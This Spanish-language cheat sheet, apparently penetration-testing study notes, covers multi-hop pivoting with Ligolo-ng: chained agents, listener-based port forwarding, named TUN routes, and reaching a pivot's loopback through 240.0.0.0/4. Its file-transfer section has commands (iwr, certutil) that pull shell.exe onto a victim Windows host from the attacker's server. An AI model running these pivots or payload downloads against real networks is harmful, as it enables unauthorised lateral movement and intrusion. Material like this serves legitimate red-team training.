---
tags:
  - pivoting
  - lateralmovement
---
## Conceptos Clave (TL;DR)

- Multi-hop (doble/triple pivot): cuando el 2o pivote NO puede contactar al atacante directamente, se abre un listener en el agente anterior que reenvia el puerto 11601 hacia el proxy. El 2o agente conecta a la IP interna del 1er pivote.
- Desde v0.8 puedes mantener VARIAS rutas/tuneles simultaneos usando multiples interfaces TUN nombradas (interface_create --name / route_add --name). En versiones antiguas solo habia un tunel activo y se conmutaba con start.
- Port forwarding: listener_add reenvia un puerto del agente hacia un destino (--addr donde escucha el agente, --to destino). Sustituye al forwarding inverso de SSH (-R) y de chisel.
- Acceso al localhost (127.0.0.1) del pivote: CIDR magica 240.0.0.0/4 (subred reservada no usada) que Ligolo redirige al loopback del agente.

## Herramientas Clave

- listener_add / listener_list / listener_stop / listener_remove: gestion de reenvio de puertos agente -> atacante.
- interface_create --name / route_add --name: crear interfaces TUN y rutas independientes por cada salto.
- ip route add (240.0.0.1/32): mapear el loopback del pivote a la TUN para escanear sus servicios locales.
- python3 -m http.server: servidor de transferencia en el atacante, expuesto al host interno via listener.

## Metodologia Paso a Paso

1. Doble pivot - crear segunda interfaz en el atacante. Cada salto a una subred distinta necesita su propia interfaz TUN nombrada (ligolo2, ligolo3...).
2. Abrir un listener en el agente del salto anterior que reenvie el 11601 hacia el proxy (127.0.0.1:11601 desde la perspectiva del tunel ya establecido). Esto da al 2o agente una via para "llegar" al proxy sin verlo directamente.
3. Lanzar el agent en el 2o pivote apuntando a la IP INTERNA del primer pivote (no a Kali).
4. Nueva sesion, ruta y tunel sobre la segunda interfaz. Para un 3er salto se repite el patron (listener en agente 2 -> agent en el 3er host -> tercera interfaz/ruta).
5. Port forwarding puntual: usar listener_add para sacar un servicio interno a tu Kali o para transferir archivos hacia el host interno.
6. Acceso a localhost del pivote: enrutar 240.0.0.1/32 por la TUN y atacar como si fuera el loopback del agente.

## Cheat Sheet de Comandos

```bash
# --- DOBLE PIVOT: Paso 1, segunda interfaz en el atacante ---
ligolo-ng » interface_create --name ligolo2
```

```bash
# --- Paso 2: listener en el agente 1 que reenvia 11601 hacia el proxy ---
# --addr = IP:puerto donde escucha el agente; --to = destino (loopback del tunel)
# --tcp = protocolo (default TCP). El puerto debe coincidir con el -connect del agente 2
[Agent : <USER>@<PIVOT1_HOST>] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Listar listeners activos
[Agent : <USER>@<PIVOT1_HOST>] » listener_list
```

```bash
# --- Paso 3: lanzar el agent en el 2o pivote contra la IP INTERNA del 1er pivote ---
./agent -connect <PIVOT1_INTERNAL_IP>:11601 -ignore-cert
```

```bash
# --- Paso 4: nueva sesion, ruta y tunel sobre la segunda interfaz ---
ligolo-ng » session
# Selecciona la sesion del 2o agente

[Agent : <USER>@<PIVOT2_HOST>] » ifconfig
[Agent : <USER>@<PIVOT2_HOST>] » route_add --name ligolo2 --route <INTERNAL_SUBNET_2>
[Agent : <USER>@<PIVOT2_HOST>] » tunnel_start --tun ligolo2
```

```bash
# --- PORT FORWARDING generico (agente -> atacante) ---
# Reenvia lo que llegue al agente en 1234 hacia 127.0.0.1:4321 (del lado del tunel)
[Agent : <USER>@<HOST>] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp

# Tabla con #, AGENT, AGENT LISTENER ADDRESS, PROXY REDIRECT ADDRESS
[Agent : <USER>@<HOST>] » listener_list

# Detener / eliminar listeners
[Agent : <USER>@<HOST>] » listener_stop 0
[Agent : <USER>@<HOST>] » listener_remove --id <ID>
```

```bash
# --- TRANSFERIR ARCHIVOS al host interno via listener ---
# El agente expone su 2222 y lo reenvia a tu http.server (127.0.0.1:8000)
[Agent : <USER>@<HOST>] » listener_add --addr 0.0.0.0:2222 --to 127.0.0.1:8000 --tcp

# En el atacante: levantar el servidor
python3 -m http.server 8000

# Desde la victima Windows: descargar usando la IP del pivote
# iwr (Invoke-WebRequest), -Uri origen, -OutFile destino
iwr -Uri http://<PIVOT_IP>:2222/shell.exe -OutFile shell.exe

# Alternativa con certutil (-urlcache -f fuerza descarga sin cache)
certutil -urlcache -f http://<PIVOT_IP>:2222/f.exe f.exe
```

```bash
# --- ACCESO AL LOCALHOST DEL PIVOTE (CIDR magica 240.0.0.0/4) ---
# Enrutar 240.0.0.1 por la TUN: ese destino = loopback del agente
sudo ip route add 240.0.0.1/32 dev ligolo

# Escanear los puertos locales del pivote (servicios bound a 127.0.0.1)
nmap 240.0.0.1 -sV

# Acceder a un servicio que solo escucha en 127.0.0.1 del pivote
curl http://240.0.0.1:8080
```

```bash
# --- EXPONER un servicio interno (ej. RDP) en tu Kali ---
# Reenvia el 3389 del agente hacia un RDP interno; luego conectas a tu propia Kali
[Agent : <USER>@<HOST>] » listener_add --addr 0.0.0.0:3389 --to <INTERNAL_RDP_IP>:3389
```

## "Gotchas" y Troubleshooting

- El puerto del listener debe COINCIDIR con el -connect del siguiente agente. La doc usa --addr 0.0.0.0:4444 --to 127.0.0.1:11601, pero cualquier puerto sirve mientras sea consistente.
- El 2o pivote NO conecta a Kali: conecta a la IP INTERNA del 1er pivote. Error comun apuntar el -connect a la IP del atacante en multi-hop.
- Cada subred nueva requiere su propia interfaz TUN nombrada (ligolo, ligolo2, ligolo3) desde v0.8; antes solo se permitia un tunel activo.
- 240.0.0.0/4 es una subred reservada/no usada deliberadamente; no la confundas con una red real del objetivo.
- Equivalencias: el "reverse port forwarding" de SSH (-R) y chisel (--reverse / R:socks) se hace aqui con listener_add. El "dynamic forwarding" (-D / SOCKS) se sustituye por una RUTA sobre la TUN, sin SOCKS.